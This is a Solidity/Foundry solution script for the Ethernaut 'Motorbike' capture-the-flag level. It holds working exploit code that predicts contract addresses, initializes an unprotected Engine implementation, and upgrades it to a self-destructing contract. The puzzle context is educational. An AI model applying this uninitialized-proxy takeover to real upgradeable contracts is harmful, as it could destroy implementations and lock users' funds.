// SPDX-License-Identifier: UNLICENSED

// since with the current state of the network
// once a contract deployment transaction is recorded
// the contract's code cannot be erased with selfdestruct...

// will be solved by a contract, not player's wallet + victory not visible in UI :(

// step 1: Use Ethernaut.sol and MotorbikeFactory.s.sol
// to find out how the contract are created
// https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/src/

// step 2: Predict the addresses of the Engine (created first) and Motorbike
// contract address = functionOf(creating account, its nonce)
// --> https://github.com/OoXooOx/Predict-smart-contract-address/blob/main/AddressPredictorCreateOpcode.sol
// replace addresses in lines 74, 75 and 106

// step 3: run the deploy script (player emitted by the log will be the Deployer contract)

// step 4: run the validate script

// step 5: view logs and verify it worked :)


pragma solidity <0.7.0;

import "lib/forge-std/src/Script.sol";
import "node_modules/@openzeppelin/contracts/access/Ownable.sol";
import {Engine} from "../src/Motorbike.sol";
import "src/AddressPredictorCreateOpcode.sol";
import {console} from "forge-std/console.sol";


contract PredictAddress is Script
{
    function run() external
    {
        AddressPredictor predictor = new AddressPredictor();
        address addr = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6; // Motorbike level
        uint nonce = 4644; // get the valid nonce with cast nonce $ADDRESS -r $RPC_URL

        address nextAddr = predictor.computeCreateAddress(addr, nonce);
        console.log("next contract address:", nextAddr);
    }
}

abstract contract Level is Ownable {
    function createInstance(address _player) external payable virtual returns (address);
    function validateInstance(address payable _instance, address _player) external virtual returns (bool);
}

interface IEthernaut
{
    function createLevelInstance(Level _level) external payable;
    function submitLevelInstance(address payable _instance) external;
}

contract Suicide
{
    fallback() external
    {
        selfdestruct(payable(address(this)));
    }
}

contract Deployer
{
    address payable ethernautAddr = payable(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelAddr = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;

    constructor() public
    {
        IEthernaut ethernaut = IEthernaut(ethernautAddr);
        Level motorbikeFactory = Level(levelAddr);

        ethernaut.createLevelInstance(motorbikeFactory);

        Suicide suicide = new Suicide();
        address suicideAddr = address(suicide);

        address engineAddr  =  0xBcc68622b83077C498860Ed7c09B1edb0f1600b7; // predict and edit
        address bikeAddress =  0xa8B646e5f59C612cae1ec56478e94aAf467aff38; // predict and edit
        Engine engine = Engine(engineAddr);

        engine.initialize();
        engine.upgradeToAndCall(suicideAddr, abi.encodeWithSignature("hello()"));
    }

    function submitInstance() external
    {
        IEthernaut(ethernautAddr).submitLevelInstance(0xa8B646e5f59C612cae1ec56478e94aAf467aff38); // motorbike instance address
    }
}

contract deploy is Script
{
    function run() external
    {
        vm.startBroadcast();

        // creation of deployer, engine and motorbike
        // will be batched into 1 transaction
        // therefore the selfdestruct trick will work
        Deployer deployer = new Deployer();

        vm.stopBroadcast();
    }
}

contract validate is Script
{
    function run() external
    {
        vm.startBroadcast();

        Deployer(0xEB71dB27d1290c156742ef6162e5ec7bc72A48E9).submitInstance();

        vm.stopBroadcast();
    }
}

//.// View logs: \\.\\

// my original transaction:
// 0xa92140fef0a282ad10aad71039c98c27c3781a3f48030ebe9a55cb49b0d8b2db
// 1 - Deployer creation
// 2 - Engine creation
// 3 - Motorbike creation
// 4 - Suicide creation

// validation transaction:
// 0x99f1df45ce0280cd77cf3c10720585b054e70c7ff3a7433890eea1926ad4cd3d

